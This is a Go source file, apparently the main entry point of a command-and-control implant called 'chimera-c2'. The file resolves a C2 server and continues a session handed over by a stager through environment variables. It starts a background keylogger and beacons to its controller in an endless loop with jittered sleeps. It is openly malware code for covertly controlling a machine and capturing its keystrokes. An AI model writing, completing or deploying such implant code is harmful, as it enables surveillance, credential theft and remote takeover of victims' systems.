package main

import (
	"encoding/base64"
	"os"

	"github.com/terancebana/chimera-c2/implant/internal/common"
)

func main() {
	common.LoadProfile()
	common.ResolveC2()

	// The stager delivers the session identity via environment
	// variables (same process). Reuse it so we continue the
	// session the stager established, instead of registering a
	// second, orphaned agent.
	if id := os.Getenv("CHIMERA_AGENT_ID"); id != "" {
		common.AgentID = id
		if sk := os.Getenv("CHIMERA_SESSION_KEY"); sk != "" {
			if b, err := base64.StdEncoding.DecodeString(sk); err == nil {
				common.SessionKey = b
			}
		}
	} else {
		// Standalone fallback (dev): mint a fresh identity + handshake.
		common.AgentID = common.GenerateAgentID()
		common.PerformHandshake()
	}

	go startKeylogger()

	for {
		beacon()
		sleepWithJitter()
	}
}
